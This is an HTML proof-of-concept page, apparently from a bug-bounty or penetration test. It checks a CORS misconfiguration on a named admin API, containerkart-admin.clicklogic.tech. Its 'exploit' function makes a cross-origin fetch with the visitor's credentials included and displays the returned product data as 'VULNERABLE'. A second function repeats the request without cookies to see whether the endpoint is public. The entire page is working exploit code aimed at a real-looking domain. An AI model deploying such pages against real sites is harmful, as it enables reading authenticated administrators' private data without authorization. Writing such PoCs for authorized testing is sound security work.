<!DOCTYPE html>
<html>
<head><title>CORS PoC</title></head>
<body>
<h2>CORS PoC - ContainerKart Admin</h2>
<button onclick="exploit()">Run PoC</button>
<button onclick="testPreflight()">Test Preflight Only</button>
<pre id="output">Output will appear here...</pre>

<script>
// Test 1: Full exploit
function exploit() {
  document.getElementById("output").innerText = "Sending request...";

  fetch("https://containerkart-admin.clicklogic.tech/api/v1/ckproducts/products/filter?page=1&per_page=15", {
    method: "GET",
    credentials: "include"
  })
  .then(r => {
    console.log("Status:", r.status);
    console.log("ACAO Header:", r.headers.get("Access-Control-Allow-Origin"));
    return r.json();
  })
  .then(data => {
    document.getElementById("output").innerText = 
      "✅ VULNERABLE!\n\n" + JSON.stringify(data, null, 2);
  })
  .catch(err => {
    document.getElementById("output").innerText = "❌ Error: " + err + 
      "\n\nCheck DevTools Console & Network tab for details";
    console.error("Full error:", err);
  });
}

// Test 2: Without credentials (confirms if endpoint is public)
function testPreflight() {
  fetch("https://containerkart-admin.clicklogic.tech/api/v1/ckproducts/products/filter?page=1&per_page=15", {
    method: "GET",
    credentials: "omit"   // no cookies
  })
  .then(r => r.json())
  .then(data => {
    document.getElementById("output").innerText = 
      "✅ Endpoint is PUBLIC (no auth needed)!\n\n" + JSON.stringify(data, null, 2);
  })
  .catch(err => {
    document.getElementById("output").innerText = "Error: " + err;
  });
}
</script>
</body>
</html>
